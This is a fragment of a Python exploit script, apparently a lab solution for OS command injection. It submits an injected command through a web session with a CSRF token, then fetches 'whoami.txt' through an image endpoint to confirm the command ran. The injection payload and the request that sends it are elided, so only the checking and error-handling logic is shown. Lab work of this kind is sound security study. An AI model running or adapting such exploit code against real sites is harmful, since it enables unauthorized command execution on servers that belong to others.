...
def exlpoit(url:str, s:requests.Session, csrf:str):
    ...
    try:
        ...
        if r.status_code == 200:
            print("Command injection submitted!")
            try:
                # image endpoint needs the filename as a parameter to show it
                req = s.get(url + '/image?filename=whoami.txt', proxies=proxies, verify=False)
                if req.status_code == 200:
                    print(f"Whoami executed: {req.text}")
                    return True
                else:
                    print("Could not access the file probably the command was not executed")
                    return False
            except requests.exceptions.RequestException as ex:
                print(f"Error: {ex}")
                return False    
        else:
            print("Could not submit the command")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False
